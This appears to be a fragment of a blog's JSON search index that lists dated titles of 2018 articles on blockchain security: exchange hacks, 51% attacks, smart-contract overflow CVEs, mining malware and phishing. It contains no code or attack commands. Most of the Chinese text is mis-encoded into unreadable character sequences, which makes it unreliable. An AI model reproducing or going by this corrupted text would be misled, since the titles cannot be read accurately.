Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-07 ç¼ºå°‘è¿”å›å€¼é”™è¯¯ - è‡³å°‘130ä¸ªä»¤ç‰Œå—åˆ°å½±å“ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:122","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-06 AACOINå¹³å°å‡ºç°BUGå¯æ— é™å†²å¸ ä»¥å¤ªåŠparityå®¢æˆ·ç«¯å­˜åœ¨æ½œåœ¨çš„å…±è¯†é—®é¢˜ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:123","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-05 Block.oneè¢«é»‘å®¢å…¥ä¾µï¼ŒæŠ•èµ„è€…ä»·å€¼æ•°ç™¾ä¸‡ç¾å…ƒçš„ä»£å¸è¢«éª— é€šä¿—æ˜“æ‡‚è°ˆBECæ™ºèƒ½åˆçº¦è‡´å‘½æ¼æ´ åŒºå—é“¾å…¥é—¨æ¼«è°ˆ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:124","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-04 EOSèŠ‚ç‚¹è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šEOSæ™ºèƒ½åˆçº¦WASMå‡½æ•°è¡¨æ•°ç»„è¶Šç•Œåˆ†æ ZenCashé­å—51ï¼…çš„æ”»å‡»ï¼Œå› åŒé‡æ”¯å‡º55ä¸‡ç¾å…ƒ å¦‚ä½•æ¸—é€æµ‹è¯•ä»¥å¤ªåŠ dApps ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:125","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-31 åŒºå—é“¾æ™ºèƒ½åˆçº¦æ¼æ´ï¼Œæƒ³è¯´è¡¥ä½ ä¸å®¹æ˜“ æµ…è°ˆæœ€è¿‘æµè¡Œçš„ä¸‰èµ·åŒºå—é“¾51%ç®—åŠ›æ”»å‡» KoreaShowï¼ˆEthereum ERC20ä»¤ç‰Œï¼‰çš„æ™ºèƒ½åˆçº¦å®æ–½çš„transferMultiå‡½æ•°ä¸­çš„æ•´æ•°æº¢å‡ºå…è®¸æ”»å‡»è€…é€šè¿‡åˆ¶ä½œçš„_valueå‚æ•°å®Œæˆæœªç»æˆæƒçš„æ•°å­—èµ„äº§å¢åŠ ã€‚ EduCoinæ™ºèƒ½åˆçº¦transferFromä»»æ„è½¬è´¦æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:126","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-30 MEWKitï¼š Cryptotheft çš„æœ€æ–°æ­¦å™¨ é»‘å®¢ä»åŠ å¯†è´§å¸äº¤æ˜“åº”ç”¨Taylorä¸­ç›—å–135ä¸‡ç¾å…ƒ EOSå­˜åœ¨P2Pæ‹’ç»æœåŠ¡æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:127","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-29 åŒºå—é“¾å²è¯—çº§æ¼æ´ å¯å®Œå…¨æ§åˆ¶è™šæ‹Ÿè´§å¸äº¤æ˜“ 360 | æ•°å­—è´§å¸é’±åŒ…APPå®‰å…¨å¨èƒæ¦‚å†µ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:128","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-28 åŠ å¯†è´§å¸äº¤æ˜“å¹³å°Tayloré­é»‘å®¢æ”»å‡»ï¼šè¢«ç›—2500ä½™ä¸ªETH èš‚èšçŸ¿æœºå¤šæ¬¾å‹å·å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-11220ï¼‰ EOSIOç¤¾åŒºçš„å¤šåæˆå‘˜åœ¨5æœˆ27æ—¥æ”¶åˆ°äº†ä¸€å°é’“é±¼é‚®ä»¶ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸‹ï¼‰ GATEäº¤æ˜“æ‰€é­é»‘å®¢æ”»å‡»ï¼ŒRLCç¬é—´çˆ†æ‹‰ç™¾å€ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:129","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-26 360 | æ•°å­—è´§å¸é’±åŒ…å®‰å…¨ç™½çš®ä¹¦ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:130","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-25 åŸºäºåŒºå—é“¾åŸŸåçš„åƒµå°¸ç½‘ç»œç—…æ¯’åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:131","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-24 ä»¥å¤ªåŠerc20æ™ºèƒ½åˆçº¦ä»»æ„è½¬è´¦æ¼æ´åˆ†æ BTG(bitcoin gold)å—åˆ°51%æ”»å‡»ï¼Œæ”»å‡»è€…åˆ©ç”¨åŒé‡æ”¯ä»˜è·åˆ© ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:132","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-22 æ¶æ„è½¯ä»¶ä¼ªè£…æˆCloudflareé¡µé¢é»˜é»˜æŒ–çŸ¿ é»‘å®¢æ­£åœ¨åˆ©ç”¨ClaymoreçŸ¿æœºæ¼æ´è¿›è¡Œå¤§èŒƒå›´çš„æ‰«æå’Œæ”»å‡» æ—¥æœ¬åŠ å¯†è´§å¸Monacoinå—è‡ªç§é‡‡çŸ¿æ”»å‡»æ”»å‡» ä»¥å¤ªåŠåŒºå—é“¾æ¸¸æˆEther Cartelå­˜åœ¨è¶Šæƒè°ƒç”¨æ¼æ´å¹¶å·²è¢«é‡å¤–åˆ©ç”¨ï¼Œåˆçº¦æ‰€æœ‰äººå¯è¢«æ”»å‡»è€…ç¯¡æ”¹ã€‚ 2017å¹´å‡å†’ICOä½¿æ¾³å¤§åˆ©äºšç´¯è®¡æŸå¤±çº¦3.4äº¿æ¾³å…ƒ OKEXç–‘ä¼¼å‡ºç°é‡å¤§bugå¯¼è‡´é’±ç”Ÿé’± XVGå¸å†æ¬¡é­å—51%ç®—åŠ›æ”»å‡» ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:133","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-19 ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ Hexagon å­˜åœ¨æº¢å‡ºæ¼æ´ éƒ¨åˆ†NEP-5ä»£å¸å­˜åœ¨å­˜å‚¨åŒºæ³¨å…¥æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:134","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-18 ã€æ¼æ´é¢„è­¦ã€‘æŒ–çŸ¿è½¯ä»¶Claymore Dual Minerè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1000049ï¼‰ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨ Dasp Top10 ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦Hexagonå­˜åœ¨æº¢å‡ºæ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:135","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-17 Cryptojackingæ”»å‡»å‡»ä¸­æ•°ç™¾ä¸ªç½‘ç«™æŒ–æ˜Monero ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸Šï¼‰ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:136","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-15 æ”»å‡»è€…å¯ä»¥åœ¨ROCï¼ˆRasputin Online Coinï¼‰ä»¤ç‰Œæ™ºèƒ½åˆçº¦ï¼ˆCVE-2018-10944ï¼‰ä¸­çªƒå–æ‰€æœ‰ä»¥å¤ªå¸ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:137","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-14 ä¼ªé€ å¾®è½¯ç­‰ä¼ä¸šç­¾åï¼Œæ¶æ€§ç—…æ¯’çªƒå–æ¯”ç‰¹å¸ç–¯ç‹‚æŒ–çŸ¿ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:138","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-12 ä»¥å¤ªåŠé’±åŒ…å‡ºç°ä»·å€¼ä¸¤ç™¾ä¸‡çš„é’“é±¼é™·é˜± ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:139","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-11 GhostMinerè§£æï¼šæ— æ–‡ä»¶æŒ–çŸ¿çš„æ–°å§¿åŠ¿ CVE-2018-10706ï¼šERC20ä»¤ç‰ŒSCAå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯å¯¼è‡´æ”»å‡»è€…è·å¾—å¤§é‡ä»£å¸ æœ€è¿‘å‡ºç°äº†ä¸€ç§æ–°å‹ä½¿ç”¨æ— æ–‡ä»¶æŠ€æœ¯çš„æ¶æ„æŒ–çŸ¿è½¯ä»¶ï¼šGhostMiner è¥¿å®‰è­¦æ–¹ç ´è·å‡å€ŸåŒºå—é“¾ä¹‹åè¿›è¡Œç½‘ç»œä¼ é”€æ¡ˆä»¶ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:140","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-10 æ¯”ç‰¹å¸ç°é‡‘æŒ–çŸ¿èŠ‚ç‚¹ä¿®å¤å¯èƒ½å¯¼è‡´ç½‘ç»œåˆ†è£‚æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:141","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-09 ä»¥å¤ªåŠParityé’±åŒ… multi-sigåº“è¢«äººè¶Šæƒé”€æ¯ï¼Œå¯¼è‡´å¤§é‡èµ„é‡‘å†»ç»“ å²ä¸Šæœ€èƒ½ç©·æŠ˜è…¾çš„æŒ–çŸ¿æœ¨é©¬â€œ520Minerâ€ï¼šæ§åˆ¶æ•°åƒå°æœºå™¨æŒ–çŸ¿ï¼Œå´ä¸€æ¯›é’±éƒ½æ²¡æŒ£åˆ° CVE-2018-10705ï¼šERC20ä»¤ç‰ŒAURAå­˜åœ¨è¶Šæƒè°ƒç”¨æ¼æ´ï¼Œå¯å¯¼è‡´æ”»å‡»è€…è·å¾—åˆçº¦æ‰€æœ‰æƒ USDT å‘è¡Œæ–¹ Tether é­å—é»‘å®¢æ”»å‡»äº‹ä»¶ CVE-2018-10666ï¼šERC20ä»¤ç‰ŒIDXMå­˜åœ¨è¶Šæƒè°ƒç”¨æ¼æ´ï¼Œå¯å¯¼è‡´æ”»å‡»è€…è·å¾—åˆçº¦æ‰€æœ‰æƒ æ”»å‡»è€…å¦‚ä½•åœ¨Bancoräº¤æ˜“æ‰€ä¸­å®æ–½å…ˆè¡Œæ”»å‡» ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:142","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-07 ä¸ºä»€ä¹ˆåŒºå—é“¾å¹¶ä¸æ€»æ˜¯é—®é¢˜çš„ç­”æ¡ˆï¼Ÿ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:143","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-04 åœ¨ç§æœ‰ä»¥å¤ªåŠä¸Šå®ç°é’ˆå¯¹ERC20æ•°å­—è´§å¸ProxyOverflowæ¼æ´çš„æ”»å‡» æéªŒGeetest | åŒºå—é“¾é¡¹ç›®è½åœ°åï¼Œæœ‰å“ªäº›å‘ä½ ä¸è¯¥è¸©ï¼Ÿ é»‘å®¢ä¼ªé€ ç®—åŠ›ç›—å–å¤šç§æ•°å­—è´§å¸ SMTæ•´å‹æº¢å‡ºæ¼æ´åˆ†æç¬”è®° ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:144","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-03 ç”±ä¸€é“CTFé¢˜å¼•å‘çš„åŒºå—é“¾â€œè‚¡æƒçº çº·æ¡ˆâ€ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:145","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-02 é»‘å®¢ä»æ¯”ç‰¹å¸çŸ¿æ± ä¸­çªƒå–83,000ç¾å…ƒ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:146","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-05-01 SMTæ™ºèƒ½åˆçº¦æ•´å‹æº¢å‡ºæ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:147","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-28 é»‘å®¢ä¼ªé€ ç®—åŠ›ä»çŸ¿æ± ç§ç›—å–å¤šç§æ•°å­—è´§å¸ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:148","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-25 é»‘å®¢ä¸¤å°æ—¶å·èµ°13000ç¾é‡‘ï¼ŒMyEtherWallet DNSåŠ«æŒäº‹ä»¶æ·±åº¦åˆ†æ BeautyChainï¼ˆBECï¼‰æ™ºèƒ½åˆçº¦ä¸­å‡ºç°äº†ä¸€ä¸ªç¾éš¾æ€§çš„æ¼æ´ï¼ˆæ•´å½¢æº¢å‡ºæ¼æ´ï¼‰ ä»¥å¤ªåŠé’±åŒ… Myetherwallet é­ DNS åŠ«æŒ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:149","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-23 éŸ©å›½æ¯”ç‰¹å¸äº¤æ˜“æ‰€Yapizonè¢«ç›—3831 BTCï¼Œç”¨æˆ·å°†å¹³æ‘Šæ‰€æœ‰æŸå¤± äº¤æ˜“æ‰€BitGrailè¢«æ”»å‡»ï¼Œå¤§é‡XRBè¢«é»‘å®¢çªƒå– å¸å®‰äº¤æ˜“æ‰€ç”¨æˆ·æƒé™è¢«ç›— ä¸€è¡Œä»£ç è’¸å‘äº†Â¥6,447,277,680 äººæ°‘å¸ï¼ GHash.ioçŸ¿æ± å¯¹èµŒåšç½‘ç«™BetCoin Diceè¿›è¡Œå¤šæ¬¡ä»˜æ¬¾æ¬ºè¯ˆï¼Œå®æ–½åŒé‡æ”¯å‡ºæ”»å‡». Blockchain.info å› è¢« DDoS æ”»å‡»æœåŠ¡ä¸´æ—¶ä¸‹çº¿ EligiusçŸ¿æ± é­å—â€œå—ä»£æ‰£æ”»å‡»â€ AntPoolï¼ŒBW.comï¼ŒNiceHashï¼ŒCKPoolå’ŒGHash.ioç­‰çŸ¿æ± é­DDOSæ”»å‡» BitcoinTalkè®ºå›é­ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡» CoinDashé¡¹ç›®ICOä¼—ç­¹åœ°å€é­åˆ°é»‘å®¢ç¯¡æ”¹ æ¯”ç‰¹å¸é»„é‡‘ç½‘ç«™é­é‡DDOSæ”»å‡» æ–¯æ´›æ–‡å°¼äºšåŠ å¯†æŒ–çŸ¿ç½‘ç«™Nicehashæ¯”ç‰¹å¸è¢«ç›— æ•°å­—ä»£å¸åˆåˆ›å…¬å¸Tetherå®£å¸ƒè‡ªå·±çš„ç³»ç»Ÿé­é‡é»‘å®¢è¢­å‡» é€šè¿‡åŠ«æŒåœ¨çº¿é’±åŒ…BlackWalletçš„DNSæœåŠ¡å™¨ï¼Œé»‘å®¢çªƒå–40ä¸‡ç¾é‡‘ åˆ©ç”¨Google Adwordsæ±¡æŸ“æœç´¢ç»“æœCoinhoarderé’“é±¼äº‹ä»¶ æ¯”ç‰¹å¸æœåŠ¡æä¾›å•†Purseå› å…¶ç”µå­é‚®ä»¶æœåŠ¡æä¾›å•†ä¹‹ä¸€å·²ç»è¢«å…¥ä¾µï¼Œç”¨æˆ·èµ„é‡‘é­çªƒ é»‘å®¢ä»…é€šè¿‡ä½¿ç”¨ç”µè¯å·ç ç›—å–ç”¨æˆ·å¤§é‡æ¯”ç‰¹å¸ äº¤æ˜“æ‰€OKExæ•°ä½ç”¨æˆ·å¹³å°è´¦å·è¢«çªƒå– CryptoShuffleræœ¨é©¬ä»å—å®³è€…çš„é’±åŒ…ä¸­å·èµ°äº†160,000ç¾å…ƒçš„æ¯”ç‰¹å¸ Bitcoin goldé­é’±åŒ…éª—å±€ï¼Œç”¨æˆ·å¯¼å…¥æ•°ç™¾ä¸‡ç¾å…ƒæ¯”ç‰¹å¸å´ä¸ç¿¼è€Œé£ IOTAç¤¾åŒºå¤§é‡ç”¨æˆ·é’±åŒ…ä»£å¸è¢«çªƒå– æœ‰äººåœ¨twitterä¸Šå†’å……çŸ¥åäººå£«å¦‚Vitalik Buterinè¯ˆéª—æ•°å­—è´§å¸ å°åº¦å¥³å­ä¸éª—å­å…±äº«è¯ä¹¦ï¼Œæ¯”ç‰¹å¸è¢«ç›— äº¤æ˜“æ‰€Cryptsyè¢«æ”»å‡»ï¼Œé»‘å®¢ä»Cryptsyçš„â€œå®‰å…¨/å†·é’±åŒ…â€è½¬è´¦æ¯”ç‰¹å¸å’Œè±ç‰¹å¸ä»¥åŠå…¶ä»–æ›´å°å‹çš„åŠ å¯†å¸ æ¯”ç‰¹å¸äº¤æ˜“å¹³å°BitQuickæœåŠ¡å™¨é­æ”»å‡» ShapeShiftä¸¢å¤±23ä¸‡ç¾å…ƒæ•°å­—è´§å¸ï¼Œâ€œå†…é¬¼â€å°†å®‰å…¨ä¿¡æ¯å‡ºå”®ç»™é»‘å®¢ é¦™æ¸¯æ•°å­—è´§å¸äº¤æ˜“æ‰€Gatecoiné­é»‘å®¢æ”»å‡» äº¤æ˜“æ‰€Bitfinexé­é»‘å®¢æ”»å‡» éŸ©å›½æœ€å¤§äº¤æ˜“æ‰€Bithumbä¸‰ä¸‡ç”¨æˆ·ä¿¡æ¯è¢«æ³„éœ² éŸ©å›½æ•°å­—è´§å¸äº¤æ˜“æ‰€Youbiteå—åˆ°é»‘å®¢å…¥ä¾µï¼Œé€ æˆçš„æŸå¤±ç›¸å½“äºå¹³å°å†…æ€»èµ„äº§çš„17% æ—¥æœ¬æœ€å¤§çš„æ¯”ç‰¹å¸äº¤æ˜“æ‰€ä¹‹ä¸€Coinchecké­é»‘å®¢æ”»å‡» åŸºäºä»¥å¤ªåŠçš„æ•°å­—è´§å¸Kryptoné­å—æ¥è‡ªä¸€ä¸ªåä¸ºâ€œ51% Crewâ€çš„ç»„ç»‡çš„51%æ”»å‡» æ¯”ç‰¹å¸ç½‘ç»œé­é‡åƒåœ¾äº¤æ˜“æ”»å‡» åœ¨çº¿é»‘å¸‚Silk Road 2é­é‡äº¤æ˜“å»¶å±•æ€§æ”»å‡»ï¼Œæ¯”ç‰¹å¸è¢«ç›— Parityå®¢æˆ·ç«¯é™„å¸¦çš„å¤šé‡ç­¾åé’±åŒ…æ™ºèƒ½åˆçº¦è¢«å‘ç°å­˜åœ¨ä¸¥é‡æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ç«‹å³æ¥ç®¡é’±åŒ…å¹¶å¸æ”¶æ‰€æœ‰èµ„é‡‘ è¿è¡Œåœ¨ä»¥å¤ªåŠå…¬æœ‰é“¾ä¸Šçš„The DAOæ™ºèƒ½åˆçº¦é­é‡æ”»å‡» å°åº¦æ¯”ç‰¹å¸äº¤æ˜“æ‰€Coinsecureå…¬å¸é’±åŒ…é­çªƒå– è™šæ‹Ÿè´§å¸ Verge(XVG)ï¼Œé­åˆ°æ”»å‡» è¿ªæ‹œæŸåŠ å¯†è´§å¸äº¤æ˜“æ‰€å‘˜å·¥çªƒå–20ä¸‡ç¾å…ƒçš„åŠ å¯†è´§å¸ä¾›ä¸ªäººä½¿ç”¨ ç«å¸ç½‘é­åˆ°DDOSæ”»å‡» Mt.Goxï¼ˆMagic: The Gathering Online Exchangeï¼‰å› å®‰å…¨æ¼æ´è¢«é»‘ï¼Œæ³„éœ²å¤§é‡æ•°æ® ä¸–ç•Œç¬¬ä¸‰å¤§æ¯”ç‰¹å¸äº¤æ˜“ä¸­å¿ƒBitomatéƒ¨åˆ†wallet.datè®¿é—®æƒé™ä¸¢å¤± ä½œä¸ºå¸¸ç”¨æ¯”ç‰¹å¸äº¤æ˜“çš„å¤„ç†ä¸­å¿ƒä¹‹ä¸€çš„MyBitcoinå®£å¸ƒé­åˆ°é»‘å®¢æ”»å‡»ï¼Œå¹¶å¯¼è‡´å…¶å…³é—­ ç”±äºç½‘ç«™æ‰˜ç®¡ä¾›åº”å•†Linodeçš„æœåŠ¡å™¨è¶…çº§ç®¡ç†å¯†ç æ³„éœ²ï¼ŒBitcoinicaäº¤æ˜“å¹³å°é’±åŒ…å†…æ¯”ç‰¹å¸è¢«é»‘å®¢çªƒå– 2012å¹´ï¼ŒBitcoinicaä¸¤åº¦é­åˆ°é»‘å®¢æ”»å‡» Bitcoin Savings and Trustè¢«æ‰€æœ‰è€…å…³é—­ Bitflooräº¤æ˜“ä¸­å¿ƒä¹Ÿè¢«é»‘å®¢å…¥ä¾µï¼ŒBitfloorå› æ­¤æš‚åœè¿è¥ æ¾³å¤§åˆ©äºšTradefortressæ¯”ç‰¹å¸é“¶è¡Œè¢«ç›— æ³¢å…°æ¯”ç‰¹å¸äº¤æ˜“å¹³å°Bidextreme.plé­å—é»‘å®¢æ”»å‡» æ›¾ç»ä¸–ç•Œç¬¬ä¸€çš„æ—¥æœ¬äº¤æ˜“æ‰€Mt.Goxï¼Œå¯¼è‡´å…¶æœ€ç»ˆè¢«è¿«å®£å¸ƒç ´äº§ ç¾å›½æ•°å­—è´§å¸äº¤æ˜“æ‰€Poloniexè¢«ç›— BTC-Eæ¯”ç‰¹å¸äº¤æ˜“å¹³å°é­å—å¼ºå¤§çš„DDOSæ”»å‡» äº¤æ˜“æ‰€LocalBitcoinsé­å—æ‹’ç»æœåŠ¡æ¼æ´æ”»å‡» BitPay CEOé­ç½‘ç»œé’“é±¼ï¼Œèµ„é‡‘è¢«éª— å›½å†…å±±å¯¨å¸äº¤æ˜“å¹³å°æ¯”ç‰¹å„¿é­åˆ°é»‘å®¢æ”»å‡» å…¨çƒçŸ¥åçš„æ•°å­—è´§å¸äº¤æ˜“æ‰€Bitstampç³»ç»Ÿç®¡ç†å‘˜è¢«è¯±å¯¼æ‰§è¡Œæ¶æ„æ–‡ä»¶ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:150","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-20 æ–°åç¤¾ï¼šåŒºå—é“¾å¦‚ä½•å¸¦æ¥ä¸ªäººæ•°æ®ä¿æŠ¤â€œé©å‘½â€ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:151","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-13 æ¸—é€æ€è·¯ | åŠ å¯†è´§å¸çŸ¿å·¥å’Œä¿¡ç”¨å¡ä¿¡æ¯æ³„éœ² ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:152","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-10 åŒºå—é“¾åº”ç”¨åœ¨ç½‘ç»œå®‰å…¨çš„å…­ä¸ªæ¡ˆä¾‹ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:153","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-04-07 åˆ©ç”¨æ ‘è“æ´¾æ¢ç´¢ä»¥å¤ªåŠç¬¬ä¸€éƒ¨åˆ†ï¼šç¯å¢ƒæ­å»º ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:154","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-03-25 3æœˆ25æ—¥å®‰å…¨çƒ­ç‚¹ - Facebookä»ç”¨æˆ·çš„æ™ºèƒ½æ‰‹æœºæ”¶é›†ç”µè¯å’ŒçŸ­ä¿¡æ•°æ® ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:155","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-03-21 å¦‚ä½•ä½¿ç”¨Goè¯­è¨€ç¼–å†™è‡ªå·±çš„åŒºå—é“¾æŒ–çŸ¿ç®—æ³• æ­ç§˜ä»¥å¤ªåŠä¸­æ½œä¼å¤šå¹´çš„â€œå·æ¸¡â€æ¼æ´ï¼Œå…¨çƒé»‘å®¢æ­£åœ¨ç–¯ç‹‚å·å¸ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:156","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-03-16 ä¸ºä»€ä¹ˆåŒºå—é“¾æœ€ç»ˆå¯èƒ½ä¼šä»¥ä¾µèš€ä½ çš„ç½‘ç»œéšç§è€Œå‘Šç»ˆï¼Ÿ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:157","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-03-12 åŒºå—é“¾å®‰å…¨ - DAOæ”»å‡»äº‹ä»¶è§£æ åŒºå—é“¾å®‰å…¨ - ä»¥å¤ªåŠçŸ­åœ°å€æ”»å‡» ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:158","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-02-05 åŒºå—é“¾å®‰å…¨æŠ€æœ¯ï¼šä¼ä¸šåº”ç”¨åŒºå—é“¾æŠ€æœ¯æ—¶å¦‚ä½•è€ƒé‡ï¼Ÿ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:159","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-01-25 åŒºå—é“¾è·¨åŸŸå®‰å…¨è§£å†³æ–¹æ¡ˆ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:160","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-01-24 360CERTâ€”â€”åŒºå—é“¾æŠ€æœ¯å®‰å…¨è®¨è®º 